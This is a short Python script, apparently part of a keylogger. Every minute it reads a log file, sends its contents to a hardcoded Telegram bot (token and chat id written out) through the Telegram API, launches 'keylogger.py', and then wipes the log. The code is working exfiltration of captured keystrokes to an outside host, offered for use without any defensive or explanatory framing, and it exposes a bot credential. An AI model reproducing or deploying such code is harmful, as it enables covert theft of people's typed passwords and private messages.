import time
import os
import datetime
import pip
import schedule
import requests

f=open('file.log','w').close()


def sendmail():
# creates SMTP session
	f=open('file.log','r')
	TOKEN = '5769936392:AAHPXa5bUGVpRiToKGETfvskf4XLdy3kj-Q'
	chat_id = '5456746744'
	message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"),f.read())
	url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"

	print(requests.get(url).json()) # this sends the message

	# message to be sent
	message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"),f.read())
	print(message)
	os.system('python keylogger.py')
	f.close()
	f=open('file.log','w').close()
schedule.every(1).minutes.do(sendmail)
#schedule.every().day.at("00:55").do(sendmail)
while True:
    schedule.run_pending()
